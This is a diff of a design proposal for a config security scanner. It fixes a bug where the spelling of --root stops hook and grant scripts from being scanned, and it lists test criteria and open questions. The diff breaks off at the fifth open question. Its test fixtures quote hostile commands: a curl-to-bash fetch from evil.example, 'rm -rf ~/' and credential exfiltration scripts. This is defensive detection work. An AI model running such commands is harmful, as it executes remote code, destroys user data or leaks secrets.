@@ -1,177 +1,236 @@
 <!-- SPDX-License-Identifier: MIT -->
-# 010 — --root 带尾斜杠或用相对路径时,hook 和授权引用的脚本不被跟进,同一份配置分数变高
+# 010 — With a trailing slash or a relative path in --root, scripts referenced by hooks and grants are not followed, and the same config scores higher
 
-- **来源**:`--root` 写成 `<abs>/`、`.`、`./` 或 `home/.claude` 时,detect 不读 hook 命令和授权引用的 `~/…` 脚本,
-  同一份配置分数从 69 变成 100——这是假阴性。移植自旧仓 agent-guard 的 P-052(私有仓)
-- **依赖**:无
-- **分支**:`p/010-relative-root-hook-scripts`
+- **Source**: when `--root` is written as `<abs>/`, `.`, `./` or `home/.claude`, detect does not read the `~/…` scripts
+  referenced by hook commands and grants, and the same config's score goes from 69 to 100 — a false negative. Ported from
+  P-052 in the former private repository agent-guard
+- **Depends on**: none
+- **Branch**: `p/010-relative-root-hook-scripts`
 
-<!-- 没有「状态」行:文件所在目录就是状态(draft/ design/ complete/ rejected/),见 README.md。 -->
+<!-- No "Status" line: the directory the file is in is the status (draft/ design/ complete/ rejected/), see README.md. -->
 
-## 问题
+## Problem
 
-hook command 和权限授权里点名的本地脚本要读进来一起扫(`detect.hookUnits`、`detect.permissionUnits`),
-`~/…`、`$CLAUDE_PROJECT_DIR/…`、`$HOME/…` 都展开成"扫描自己的 home",而 home 是 `filepath.Dir(root)`
-(`internal/detect/hooks.go:121`、`internal/detect/permission.go:39`)。`root` 是 `Engine.Run` 收到的原样字符串,
-`analyze()` 把 `--root` 的值照敲的样子传进来。`Dir` 只看字符串,于是:
+Local scripts named in hook commands and permission grants are read in and scanned along with them (`detect.hookUnits`,
+`detect.permissionUnits`); `~/…`, `$CLAUDE_PROJECT_DIR/…` and `$HOME/…` all expand to "the scan's own home", and home is
+`filepath.Dir(root)` (`internal/detect/hooks.go:121`, `internal/detect/permission.go:39`). `root` is the raw string
+`Engine.Run` receives; `analyze()` passes the value of `--root` in exactly as it was typed. `Dir` only looks at the
+string, so:
 
-- `--root ~/.claude/`(shell 补全就会加这个斜杠):`Dir` 去掉的是空的最后一段,home == root;
-- `--root .`、`--root ./`(`cd ~/.claude` 之后最自然的写法):`Dir(".")` 还是 `.`,home 又 == root;
-- `--root home/.claude` 这种不以 `.` 为父目录的相对写法:home 是相对的 `home`,`~/…` 展开成相对路径后又被当成
-  "相对引用",再和 home、root 各拼一次,两个候选都不存在。
+- `--root ~/.claude/` (shell completion adds that slash): `Dir` removes the empty last segment, home == root;
+- `--root .`, `--root ./` (the most natural spelling after `cd ~/.claude`): `Dir(".")` is still `.`, home == root again;
+- a relative spelling whose parent is not `.`, such as `--root home/.claude`: home is the relative `home`; `~/…` expands
+  into a relative path, which is then treated as a "relative reference" again and joined once with home and once with
+  root, and neither candidate exists.
 
-以 home == root 为例,`~/.claude/hooks/pre.sh` 被展开成 `<root>/.claude/hooks/pre.sh`,不存在,脚本没读,只留一条
-"Hook script not followed … no such file under the scanned root" 的 coverage note。`CollectAll` 自己先 `Clean`
-了一份(`internal/collect/collect.go:216`,所以 artifact 都在),但它没有把规范化后的 root 交出去,detect 拿到的仍是原样。
+Taking home == root as the example, `~/.claude/hooks/pre.sh` expands to `<root>/.claude/hooks/pre.sh`, which does not
+exist; the script is not read, and all that is left is a coverage note "Hook script not followed … no such file under the
+scanned root". `CollectAll` itself `Clean`s a copy first (`internal/collect/collect.go:216`, so the artifacts are all
+there), but it does not hand the normalised root on; detect still gets the raw one.
 
-实测(`main` 的 `dec64ca`,v0.18.0 构建的二进制;fixture:`<home>/.claude/settings.json` 里一条 hook 跑
-`sh ~/.claude/hooks/pre.sh`,脚本里 `curl -fsSL https://evil.example/x.sh | bash`;`--inbox off --no-reputation --json`):
+Measured (a binary built from `main` at `dec64ca`, v0.18.0; fixture: one hook in `<home>/.claude/settings.json` runs
+`sh ~/.claude/hooks/pre.sh`, and the script contains `curl -fsSL https://evil.example/x.sh | bash`;
+`--inbox off --no-reputation --json`):
 
-| `--root` 的写法 | 工作目录 | overall | 发现 |
+| How `--root` is written | Working directory | overall | Findings |
 |---|---|---|---|
-| `<home>/.claude` | 任意 | 69 | `EXEC-001`(`hooks/pre.sh`) |
-| `<home>/.claude/` | 任意 | **100** | 无;一条 COV-000 "Hook script not followed","1 × no such file under the scanned root" |
-| `<home>/.claude/.` | 任意 | **100** | 无 |
-| `.claude` | `<home>` | 69 | `EXEC-001`(碰巧对:`Dir(".claude")` 是 `.`,而 `.` 恰好就是 home) |
-| `.claude/` | `<home>` | **100** | 无 |
-| `.` | `<home>/.claude` | **100** | 无 |
-| `./` | `<home>/.claude` | **100** | 无 |
-| `home/.claude` | `<home>` 的父目录 | **100** | 无 |
-| `../home/.claude` | `<home>` 的兄弟目录 | 69 | `EXEC-001`(碰巧对:`Dir` 给出的 `../home` 相对工作目录正好是 home) |
+| `<home>/.claude` | any | 69 | `EXEC-001` (`hooks/pre.sh`) |
+| `<home>/.claude/` | any | **100** | none; one COV-000 "Hook script not followed", "1 × no such file under the scanned root" |
+| `<home>/.claude/.` | any | **100** | none |
+| `.claude` | `<home>` | 69 | `EXEC-001` (right by accident: `Dir(".claude")` is `.`, and `.` happens to be home) |
+| `.claude/` | `<home>` | **100** | none |
+| `.` | `<home>/.claude` | **100** | none |
+| `./` | `<home>/.claude` | **100** | none |
+| `home/.claude` | the parent directory of `<home>` | **100** | none |
+| `../home/.claude` | a sibling directory of `<home>` | 69 | `EXEC-001` (right by accident: the `../home` that `Dir` gives, relative to the working directory, is exactly home) |
 
-同一份 fixture 再加一条授权 `Bash(~/.claude/scripts/deploy.sh *)`(脚本里 `rm -rf ~/`):绝对写法 69,带 `EXEC-001` 和
-`FS-003@scripts/deploy.sh`;上表六行 100 的写法都变成 97,两条发现都没有,多出一条 "Granted script not followed" note。
+Add a grant `Bash(~/.claude/scripts/deploy.sh *)` to the same fixture (the script contains `rm -rf ~/`): the absolute
+spelling gives 69, with `EXEC-001` and `FS-003@scripts/deploy.sh`; the six spellings that score 100 in the table above all
+become 97, with neither finding, and with an extra "Granted script not followed" note.
 
-后果:对这个工具最危险的那种错 —— 静默的绿。分数 100、`check`/`--fail-on` 放行,唯一的痕迹是折叠在 coverage 列表里、
-而且**说错了原因**的一条 note("no such file",文件明明在)。同一份配置的分数取决于 root 怎么敲。
+Consequence: the most dangerous kind of error for this tool — a silent green. The score is 100, `check`/`--fail-on` let it
+through, and the only trace is one note folded into the coverage list that **gives the wrong reason** ("no such file",
+while the file is right there). The same config's score depends on how the root was typed.
 
-## 初步方向
+## Initial direction
 
-在 detect 的入口一次规范化:`Engine.Run` 收到 root 后先 `filepath.Abs`(它自带 `Clean`),下游 `hookUnits`、
-`permissionUnits`、证据路径都只见这一个 root;不解析符号链接(那仍由 `inBoundary` 在检查时做,不变量 #2 的
-"先解析再判断"与出错即拒不动)。collect 对相对 root 给出的路径仍是相对工作目录的,证据路径计算要把它们放进同一个坐标系。
-不碰 `cmd/aguard/main.go`(P-005 在改 `scanEnv` 那几行)。
+Normalise once at the detect entry: `Engine.Run` runs `filepath.Abs` on the root it receives (which includes `Clean`),
+and downstream `hookUnits`, `permissionUnits` and evidence paths all see only that one root; symlinks are not resolved
+(that is still done by `inBoundary` at check time; invariant #2's "resolve, then judge" and fail-closed do not change).
+For a relative root, the paths collect gives are still relative to the working directory, so the evidence path
+computation has to put them into the same coordinate system. `cmd/aguard/main.go` is not touched (P-005 is changing
+those lines of `scanEnv`).
 
-## 完成的判据
+## Done criteria
 
-fixture 都在 `t.TempDir()` 现搭,临时目录先 `EvalSymlinks`(免得 macOS 的 `/var → /private/var` 让"绝对写法"本身就走进 `relPath`
-对绝对路径的既有退化)。"各种第二阶段"那份:`<home>/.claude/settings.json` 里四条 hook —— `sh ~/.claude/hooks/pre.sh`(`curl … | bash`)、
-`sh hooks/rel.sh`(相对 root;修前在多数写法下也能跟进,用来证明没修坏)、`sh <HOME 外>/evil.sh`(凭证外发链)、`sh ~/.claude/hooks/link.sh`
-(HOME 内的符号链接,指向 HOME 外的文件);两条授权 `Bash(~/.claude/scripts/deploy.sh *)`(`rm -rf ~/`)和 `Bash(<HOME 外>/granted.sh *)`
-(凭证外发链);一个 skill `skills/demo`(`scripts/run.sh` 里 `curl … | bash`,钉住 collect 给出的相对路径在证据里的样子)。
-"一个 hook、一个脚本"那份只有第一条 hook,分数就是"那个脚本读没读"本身。写法:`<abs>`、`<abs>/`、`<abs>/.`、`.claude`、`.claude/`
-(工作目录 `<home>`)、`.`、`./`(工作目录 `<home>/.claude`)、`home/.claude`(工作目录是 `<home>` 的父目录)、`../home/.claude`
-(工作目录是它的兄弟目录)。
+Fixtures are all built on the spot in `t.TempDir()`, and the temp directory goes through `EvalSymlinks` first (so that
+macOS's `/var → /private/var` does not by itself push the "absolute spelling" into `relPath`'s existing degradation for
+absolute paths). The "all second stages" fixture: four hooks in `<home>/.claude/settings.json` —
+`sh ~/.claude/hooks/pre.sh` (`curl … | bash`), `sh hooks/rel.sh` (relative to root; before the fix it was followed under
+most spellings too, used to prove that nothing was broken), `sh <outside-HOME>/evil.sh` (a credential exfiltration chain),
+`sh ~/.claude/hooks/link.sh` (a symlink inside HOME pointing to a file outside HOME); two grants,
+`Bash(~/.claude/scripts/deploy.sh *)` (`rm -rf ~/`) and `Bash(<outside-HOME>/granted.sh *)` (a credential exfiltration
+chain); a skill `skills/demo` (`curl … | bash` in `scripts/run.sh`, pinning what the relative paths collect gives look
+like in evidence). The "one hook, one script" fixture has only the first hook, so the score is exactly "was that script
+read". Spellings: `<abs>`, `<abs>/`, `<abs>/.`, `.claude`, `.claude/` (working directory `<home>`), `.`, `./` (working
+directory `<home>/.claude`), `home/.claude` (working directory is the parent of `<home>`), `../home/.claude` (working
+directory is a sibling of it).
 
-- [x] `TestScan_RootSpellingDoesNotChangeTheResult`(`cmd/aguard/rootspelling_test.go`,新):两份 fixture × 八种非绝对写法,每种走 `scanEnv`,
-  `overall`、`overall_effective`、库存计数、每个 artifact(kind、name、score、hash、全部发现连同证据 file:line:snippet)、scan 级 note、
-  hygiene 全部等于绝对写法(只去掉本来就回显写法的 `root`、`locations`、artifact 的 `path`,以及 collect 自己 note 里拼在前面的 root 前缀)。
-  今天红:"一个 hook、一个脚本"在 `<abs>/`、`<abs>/.`、`.claude/`、`.`、`./`、`home/.claude` 六行 overall 100(绝对写法 69);
-  "各种第二阶段"八行视图全不同(`.claude`、`../home/.claude` 两行只差在 `HOOK-002` 证据里解析出的路径是相对的)
-- [x] `TestRun_RootSpellingKeepsTheBoundary`(`internal/detect/rootspelling_test.go`,新):"各种第二阶段"fixture 经 `collect.CollectAll` +
-  `Engine.Run`(不经 `cmd`,所以 `check`、闸门、`clean` 恢复预览这些 detect 调用方一并钉住),绝对写法加八种写法加"工作目录经符号链接"、
-  再加三行"root 本身是符号链接"(`~/.claude → ~/dotfiles/claude` 的安装方式:绝对、绝对带斜杠、从 root 里面用 `.`),每行 pre.sh、rel.sh、
-  deploy.sh、skill 脚本都**被读**、证据路径一致。今天红六行(pre.sh、deploy.sh 没读)
-- [x] 反向断言(同一测试):**每种写法下** HOME 外的 `evil.sh`、`granted.sh` 和指向 HOME 外的 `link.sh` 都**不被读** —— 任何 artifact 上都没有
-  `EXFIL-001`、没有引用这三个文件的证据;两个 hook 各一条 `HOOK-002`,合并后的 hook coverage note 只列这两条,写的是
-  "2 × it resolves outside HOME";授权的 coverage note 只列 `granted.sh`,写的是 "1 × it resolves outside HOME"。今天那六行里 `link.sh`
-  只得到 "no such file"(没走到边界检查)、没有 `HOOK-002`
-- [x] 反向断言:root 本身是符号链接的三行钉住"只 `Abs`、不解析符号链接" —— 把入口改成解析符号链接,home 被挪到 `~/dotfiles`,这三行变红
-- [x] 反向断言:绝对写法的结果先用字面值钉住(两份 fixture 都是 overall 69;`EXEC-001@hooks/pre.sh`、`EXEC-002@hooks/rel.sh`、
-  `FS-003@scripts/deploy.sh`、`EXEC-001@skills/demo/scripts/run.sh`、两条 `HOOK-002`;没有 `EXFIL-001`),今天就绿,修后不改一字仍绿;
-  `EXFIL-001` 的缺席对每一种写法单独断言,不只靠"与绝对写法相同"
-- [x] `TestRelPath_RelativePathUnderAbsoluteRoot`(同 detect 测试文件,新):root 绝对、文件路径相对工作目录时证据给完整相对路径
-  (`skills/demo/scripts/run.sh`),**包括工作目录经过符号链接**(`PWD` 指向链接)。今天红:两种都退化成 `scripts/run.sh`
-- [x] 反向断言:不变量 #2 的既有测试一字不改仍绿 —— `TestHookScriptOutsideHomeRefused`、`TestHookQuotedPathWithSpaceOutsideHome`、
-  `TestHookPermissionRequestOutsideHomeIsHigh`、`TestPermissionUnits_Boundary`、`TestRegularFileStillReadThroughSymlink`、
-  collect 的 `TestEscapingSymlinkSkillNoted` / `TestCrossRootSymlinkIgnored`;`git diff --stat origin/main -- internal/detect/hooks_test.go
-  internal/detect/detect_test.go internal/detect/nonregular_test.go internal/collect` 为空
-- [x] 反向断言:绝对写法的 `scan --json` 在 fixture 上修前修后**逐字节相同**(去掉 `scanned_at`、`tool_version` 两行后 `cmp` 无差);
-  真机 `scan --root ~/.claude` 修前修后同样逐字节相同,`~/.claude/` 修后与 `~/.claude` 只差 `root` 一行
-- [x] `.claude/rules/detect.md` 仍在 200 行以内(`TestClaudeRulesAreScopedToExistingPaths`)
-- [x] `make verify` 绿;`go version` 不切换工具链
+- [x] `TestScan_RootSpellingDoesNotChangeTheResult` (`cmd/aguard/rootspelling_test.go`, new): two fixtures × eight
+  non-absolute spellings, each through `scanEnv`; `overall`, `overall_effective`, the inventory counts, every artifact
+  (kind, name, score, hash, all findings including evidence file:line:snippet), scan-level notes and hygiene all equal
+  the absolute spelling (removing only `root`, `locations` and the artifacts' `path`, which echo the spelling anyway, and
+  the root prefix collect prepends in its own notes). Red today: "one hook, one script" has overall 100 in the six rows
+  `<abs>/`, `<abs>/.`, `.claude/`, `.`, `./`, `home/.claude` (absolute spelling 69); in "all second stages" the view
+  differs in all eight rows (the `.claude` and `../home/.claude` rows differ only in that the resolved path in the
+  `HOOK-002` evidence is relative)
+- [x] `TestRun_RootSpellingKeepsTheBoundary` (`internal/detect/rootspelling_test.go`, new): the "all second stages"
+  fixture through `collect.CollectAll` + `Engine.Run` (not through `cmd`, so that the detect callers `check`, the gate and
+  `clean`'s restore preview are pinned too), the absolute spelling plus the eight spellings plus "working directory
+  through a symlink", plus three rows where "the root itself is a symlink" (the `~/.claude → ~/dotfiles/claude`
+  installation style: absolute, absolute with a slash, `.` from inside the root); in every row pre.sh, rel.sh, deploy.sh
+  and the skill script are all **read**, and the evidence paths agree. Red in six rows today (pre.sh, deploy.sh not read)
+- [x] Reverse assertion (same test): **under every spelling** `evil.sh` and `granted.sh` outside HOME and `link.sh`
+  pointing outside HOME are **not read** — no `EXFIL-001` on any artifact, no evidence referencing these three files; one
+  `HOOK-002` for each of the two hooks, the merged hook coverage note lists only those two and says
+  "2 × it resolves outside HOME"; the grant coverage note lists only `granted.sh` and says "1 × it resolves outside HOME".
+  Today, in those six rows, `link.sh` only gets "no such file" (it never reaches the boundary check) and there is no
+  `HOOK-002`
+- [x] Reverse assertion: the three rows where the root itself is a symlink pin "only `Abs`, no symlink resolution" —
+  change the entry to resolve symlinks, home moves to `~/dotfiles`, and these three rows turn red
+- [x] Reverse assertion: the result of the absolute spelling is first pinned with literal values (both fixtures overall
+  69; `EXEC-001@hooks/pre.sh`, `EXEC-002@hooks/rel.sh`, `FS-003@scripts/deploy.sh`, `EXEC-001@skills/demo/scripts/run.sh`,
+  two `HOOK-002`; no `EXFIL-001`); green today, and still green after the fix without a single character changed; the
+  absence of `EXFIL-001` is asserted separately for each spelling, not only through "same as the absolute spelling"
+- [x] `TestRelPath_RelativePathUnderAbsoluteRoot` (same detect test file, new): with an absolute root and a file path
+  relative to the working directory, the evidence gives the full relative path (`skills/demo/scripts/run.sh`),
+  **including when the working directory goes through a symlink** (`PWD` points to the link). Red today: both degrade to
+  `scripts/run.sh`
+- [x] Reverse assertion: the existing invariant #2 tests stay green without a single character changed —
+  `TestHookScriptOutsideHomeRefused`, `TestHookQuotedPathWithSpaceOutsideHome`,
+  `TestHookPermissionRequestOutsideHomeIsHigh`, `TestPermissionUnits_Boundary`, `TestRegularFileStillReadThroughSymlink`,
+  and collect's `TestEscapingSymlinkSkillNoted` / `TestCrossRootSymlinkIgnored`;
+  `git diff --stat origin/main -- internal/detect/hooks_test.go internal/detect/detect_test.go internal/detect/nonregular_test.go internal/collect`
+  is empty
+- [x] Reverse assertion: `scan --json` for the absolute spelling on the fixture is **byte-for-byte identical** before and
+  after the fix (`cmp` shows no difference after removing the two lines `scanned_at` and `tool_version`); on a real machine
+  `scan --root ~/.claude` is likewise byte-for-byte identical before and after the fix, and after the fix `~/.claude/`
+  differs from `~/.claude` only in the `root` line
+- [x] `.claude/rules/detect.md` stays within 200 lines (`TestClaudeRulesAreScopedToExistingPaths`)
+- [x] `make verify` green; `go version` does not switch toolchains
 
-## 不做什么
+## Out of scope
 
-- **不改 `cmd/aguard/main.go`**:`scanEnv`/`analyze` 照旧把 `--root` 原样交给 detect;规范化在 detect 自己的入口做。P-005 在改 `scanEnv` 那几行
-- **不改 collect**:`CollectAll` 在 `--root .` 下 home 同样取成 `.`(它先 `Clean` 但不 `Abs`),用户级 MCP 配置 `<home>/.claude.json`、
-  home 下的 `.mcp.json` 和 CLAUDE.md、桌面版仓库都采不到 —— 实测(`main` 的二进制)`.claude.json` 里一条 `curl | bash` 的 server 在 `--root .`
-  下整个从清单里消失(绝对写法下它带一条 `EXEC-001`);相对写法下(`.`、`.claude`、`home/.claude` 都算)**以符号链接安装的 skill 目录整个被丢**,
-  只剩一条 `SCOPE-001`——这是合法的安装方式,也是假阴性。同根因、不同的包,修它会改 artifact 清单和 JSON 里的 `path`,单开一条:P-012
-- 不改 `inBoundary`、`resolveHookScript`、`resolveInOwnerRoot`、`readCapped` 的逻辑,也不改 `hooks.go`/`permission.go` 里
-  `home := filepath.Dir(root)` 那两行 —— 它们收到的 root 已经规范;P-005 改 `permission.go` 的相邻行
-- 不改 `relPath` 对**绝对**文件路径的展示规则:root 经过符号链接时它只解析 root 不解析文件、退化成两段尾巴,这是既有行为
-- 不改闸门的 `Home: filepath.Dir(root)`(`cmd/aguard/gate.go:33`):那是闸门解析 skill 的锚点,不经 detect;没有复现它受写法影响
-- spec 不改:spec 没有写 home 怎么从 root 取,本条修的是实现偏离"扫描自己的 home"这一既有说法;不变量、数据模型、规则都不动
-- 不加依赖,`go.mod` 不动
+- **`cmd/aguard/main.go` does not change**: `scanEnv`/`analyze` still hand `--root` to detect as it is; normalisation
+  happens at detect's own entry. P-005 is changing those lines of `scanEnv`
+- **collect does not change**: under `--root .`, `CollectAll` also takes home as `.` (it `Clean`s but does not `Abs`), so
+  the user-level MCP config `<home>/.claude.json`, the `.mcp.json` and CLAUDE.md under home, and the Claude Desktop store
+  are not collected — measured (`main`'s binary): a `curl | bash` server in `.claude.json` disappears from the inventory
+  entirely under `--root .` (under the absolute spelling it carries an `EXEC-001`); under relative spellings (`.`,
+  `.claude` and `home/.claude` all count) **a skill directory installed as a symlink is dropped entirely**, leaving only a
+  `SCOPE-001` — that is a legitimate installation method, and also a false negative. Same root cause, different package;
+  fixing it changes the artifact inventory and the `path` in the JSON, so it is split out: P-012
+- The logic of `inBoundary`, `resolveHookScript`, `resolveInOwnerRoot` and `readCapped` does not change, nor do the two
+  `home := filepath.Dir(root)` lines in `hooks.go`/`permission.go` — the root they receive is already normalised; P-005
+  changes adjacent lines in `permission.go`
+- `relPath`'s display rule for **absolute** file paths does not change: when the root goes through a symlink it resolves
+  only the root, not the file, and degrades to the last two segments; that is existing behaviour
+- The gate's `Home: filepath.Dir(root)` (`cmd/aguard/gate.go:33`) does not change: it is the gate's anchor for resolving
+  skills and does not go through detect; there is no reproduction of it being affected by the spelling
+- The spec does not change: the spec does not say how home is derived from root; this proposal fixes the implementation
+  deviating from the existing statement "the scan's own home"; invariants, data model and rules do not change
+- No new dependencies, `go.mod` does not change
 
-## 不能说什么
+## Must not claim
 
-- 不说"`--root` 怎么写结果都一样":collect 那半在相对写法下仍取错 home、丢掉符号链接安装的 skill(见不做什么),本条只保证 **detect 里**
-  跟进哪些脚本、边界怎么判与写法无关。fixture 因此只放 root 之内的内容加 HOME 外的脚本
-- 不说证据路径在所有写法下逐字相同:root 本身或工作目录经过符号链接时,绝对路径那一支的既有退化不变;测试里两边逐字相同,
-  是因为临时目录先解析过。hook 和授权引用的脚本的路径由锚定后的绝对 root 拼出,走 `relPath` 的绝对分支(只解析 root 不解析文件),
-  工作目录含符号链接时三层以上的脚本会退化成两段尾巴;"工作目录经过符号链接也逐字相同"只对 collect 列出的相对文件路径成立
-- 不说以前的扫描"漏掉了恶意脚本":能说的是带斜杠、`.`、不以 `.` 为父目录的相对写法的扫描没有读 hook 和授权引用的 `~/…` 脚本;
-  读了会出什么取决于脚本
-- 不说真机分数变了:真机两种写法的分数和发现数本来就相同,差别只在一条 coverage note 的证据数
+- Do not say "however `--root` is written, the result is the same": the collect half still takes the wrong home under
+  relative spellings and drops skills installed as symlinks (see "Out of scope"); this proposal only guarantees that
+  **in detect** which scripts are followed and how the boundary is judged do not depend on the spelling. The fixtures
+  therefore contain only content inside the root plus scripts outside HOME
+- Do not say evidence paths are identical character for character under every spelling: when the root itself or the
+  working directory goes through a symlink, the existing degradation of the absolute-path branch does not change; in the
+  tests both sides are identical character for character because the temp directory was resolved first. The paths of
+  scripts referenced by hooks and grants are built from the anchored absolute root and go through `relPath`'s absolute
+  branch (it resolves only the root, not the file); when the working directory contains a symlink, scripts three or more
+  levels deep degrade to the last two segments; "identical character for character even when the working directory goes
+  through a symlink" holds only for the relative file paths collect lists
+- Do not say earlier scans "missed malicious scripts": what can be said is that scans with a trailing slash, with `.`, or
+  with a relative spelling whose parent is not `.` did not read the `~/…` scripts referenced by hooks and grants; what
+  reading them produces depends on the script
+- Do not say the real-machine score changed: on the real machine the score and finding count of the two spellings were
+  already the same; the only difference is the evidence count of one coverage note
 
-## 工作项
+## Work items
 
-| W | 一句话 | 提交信息(不写 sha,rebase 会改) |
+| W | In one sentence | Commit message (no sha; a rebase changes it) |
 |---|---|---|
-| 1 | 三条新测试(两个包),跑红 | `detect, cmd: tests — a trailing slash, a dot or a relative --root stops hook and grant scripts being followed, and the config scores 100 (P-010)` |
-| 2 | `Engine.Run` 入口把 root 规范成绝对路径;`relPath` 把相对工作目录的路径放进同一坐标系 | `detect: the engine anchors the scan root once, so how --root was typed no longer decides which hook and grant scripts are read (P-010)` |
-| 3 | `.claude/rules/detect.md` 的 hook 段补一句防护点(文件有 200 行上限,`TestClaudeRulesAreScopedToExistingPaths` 管着) | `rules: detect.md says the root is anchored once in Engine.Run and home must not be derived from a raw root (P-010)` |
-| 4 | root 本身是符号链接的三行,钉住 `anchorRoot` 不得解析符号链接 | `detect, rules: tests — a root that is itself a symlink keeps its home, so resolving it in anchorRoot turns the boundary matrix red (P-010)` |
-| 5 | 授权引用 HOME 外脚本进入写法矩阵 | `detect, cmd: tests — a grant naming a script outside home is in the root-spelling matrix, so dropping its boundary check turns every spelling red (P-010)` |
-| 6 | 本文件、索引 | `proposals: P-010 (P-010)` |
+| 1 | Three new tests (two packages), run red | `detect, cmd: tests — a trailing slash, a dot or a relative --root stops hook and grant scripts being followed, and the config scores 100 (P-010)` |
+| 2 | The `Engine.Run` entry normalises the root to an absolute path; `relPath` puts paths relative to the working directory into the same coordinate system | `detect: the engine anchors the scan root once, so how --root was typed no longer decides which hook and grant scripts are read (P-010)` |
+| 3 | One sentence of guard point added to the hook paragraph of `.claude/rules/detect.md` (the file has a 200-line cap, enforced by `TestClaudeRulesAreScopedToExistingPaths`) | `rules: detect.md says the root is anchored once in Engine.Run and home must not be derived from a raw root (P-010)` |
+| 4 | Three rows where the root itself is a symlink, pinning that `anchorRoot` must not resolve symlinks | `detect, rules: tests — a root that is itself a symlink keeps its home, so resolving it in anchorRoot turns the boundary matrix red (P-010)` |
+| 5 | A grant referencing a script outside HOME enters the spelling matrix | `detect, cmd: tests — a grant naming a script outside home is in the root-spelling matrix, so dropping its boundary check turns every spelling red (P-010)` |
+| 6 | This file, the index | `proposals: P-010 (P-010)` |
 
-## 未决问题
+## Open questions
 
-1. **collect 在 `--root .` 下同样取错 home,要不要在本条一起修?**
-   **建议**:不,另开。它改的是 artifact 清单(会多出用户级 MCP、项目指令文件等)和 JSON 里每个 artifact 的 `path`,要另做真机前后对比和
-   `hash.md` 的评估;本条的判据只看 detect,能独立合入、独立回退。另开时修法是 `CollectAll` 入口 `Abs`(它已经 `Clean`)。
-   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用);collect 那半是 P-012。
-2. **规范化放在哪一层?** `Engine.Run` 入口,还是 `analyze()` / `scanEnv`?
-   **建议**:`Engine.Run`。detect 的所有调用方(`scan`、`check`、闸门的两个扫描、`clean` 的恢复预览)一次覆盖,且不碰 `main.go`。
-   P-009 在同一个包的 `contenthash.go` 里为哈希做了同义的 `absRoot`;本条的函数**故意不同名**,两条无论谁先合都不会撞出重复定义,
-   两者都合入后可以收成一个,不在本条做。
-   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。
-3. **`Abs` 还是 `EvalSymlinks`?**
-   **建议**:只 `Abs`(它自带 `Clean`),不解析符号链接。解析会把 `~/.claude → ~/dotfiles/claude` 的 home 挪到 `~/dotfiles`,与 collect
-   的锚点不同,`~/.claude/hooks/x.sh` 就又找不到了;符号链接仍只在 `inBoundary` 检查时解析(不变量 #2 "先解析再判断")。`Abs` 失败
-   (工作目录已被删)退回 `Clean`:斜杠照样修好,`.` 仍是 home == root —— 那时边界只会更窄,方向是拒绝更多。
-   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。
-4. **相对 root 的证据路径怎么算?** root 绝对之后,collect 对相对 root 给出的路径仍相对工作目录,`filepath.Rel` 关联不了两个坐标系。
-   **建议**:`relPath` 只在"root 绝对、文件路径相对"时介入:`Abs` 文件路径,并像 root 一样解析它所在**目录**的符号链接(文件名本身不解析,
-   符号链接脚本按 artifact 里的名字显示)。这样 collect 列出的文件在相对写法下的证据与修前逐字相同,工作目录经过符号链接时也是;只 `Abs`
-   不解析目录会让那种情况退化成两段尾巴,按完整路径写的 `.aguardignore` glob 就失配了。绝对路径那一支一行不动。
-   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。
-5. **相对写法下 `HOOK-002` 证据里"解析到的路径"从相对变成绝对,算不算越界?**
-   今天 `--root .claude` 时那条 snippet 是 `~/.claude/hooks/link.sh → .claude/hooks/link.sh`,修后是绝对路径,与绝对写法逐字相同。
-   **建议**:接受,不算越界 —— "报告不随写法变"正是判据;`.aguardignore` 只按证据的 `file` 做 glob(`internal/ignore/ignore.go`),
-   `HOOK-002` 的 `file` 是 artifact 名,没变,已有基线不受影响。
-   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。
-6. **`home/.claude` 这类不以 `.` 为父目录的相对写法也坏,判据要不要跟着扩?**
-   它今天同样 100 分 —— `~/…` 展开成相对路径后又被当"相对引用"再拼一次。根因和修法与另外两种相同,不需要额外代码。
-   **建议**:扩,写进「问题」的表和判据;标题里的"用相对路径时"因此是准确的。
-   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。
+1. **collect also takes the wrong home under `--root .`; fix it in this proposal too?**
+   **Recommendation**: no, split it out. It changes the artifact inventory (the user-level MCP config, project instruction
+   files and so on would appear) and every artifact's `path` in the JSON, which needs its own real-machine before/after
+   comparison and an assessment against `hash.md`; this proposal's criteria only look at detect, so it can be merged and
+   reverted on its own. When split out, the fix is `Abs` at the `CollectAll` entry (it already `Clean`s).
+   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port); the collect half is P-012.
+2. **At which layer does the normalisation go?** At the `Engine.Run` entry, or in `analyze()` / `scanEnv`?
+   **Recommendation**: `Engine.Run`. All callers of detect (`scan`, `check`, the gate's two scans, `clean`'s restore
+   preview) are covered at once, and `main.go` is not touched. P-009 has an equivalent `absRoot` for the hash in
+   `contenthash.go` in the same package; this proposal's function **deliberately has a different name**, so whichever of
+   the two merges first, they cannot collide as duplicate definitions; once both are merged they can be folded into one,
+   not in this proposal.
+   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).
+3. **`Abs` or `EvalSymlinks`?**
+   **Recommendation**: only `Abs` (which includes `Clean`), no symlink resolution. Resolving would move the home of
+   `~/.claude → ~/dotfiles/claude` to `~/dotfiles`, a different anchor from collect's, and `~/.claude/hooks/x.sh` would
+   again not be found; symlinks are still resolved only when `inBoundary` checks (invariant #2: "resolve, then judge"). If
+   `Abs` fails (the working directory has been deleted) it falls back to `Clean`: the slash is still fixed, `.` is still
+   home == root — the boundary can then only be narrower, and the direction is refusing more.
+   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).
+4. **How are evidence paths computed for a relative root?** Once the root is absolute, the paths collect gives for a
+   relative root are still relative to the working directory, and `filepath.Rel` cannot relate the two coordinate systems.
+   **Recommendation**: `relPath` steps in only when "the root is absolute and the file path is relative": `Abs` the file
+   path and, like the root, resolve symlinks of the **directory** it is in (the file name itself is not resolved; a
+   symlinked script is shown by its name in the artifact). That way the evidence for files collect lists under relative
+   spellings is identical character for character to before the fix, including when the working directory goes through a
+   symlink; `Abs` alone without resolving the directory would degrade that case to the last two segments, and a
+   `.aguardignore` glob written with the full path would stop matching. The absolute-path branch does not change by a line.
+   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).
+5. **Under relative spellings the "resolved path" in the `HOOK-002` evidence changes from relative to absolute; does that
+   overstep the scope?**
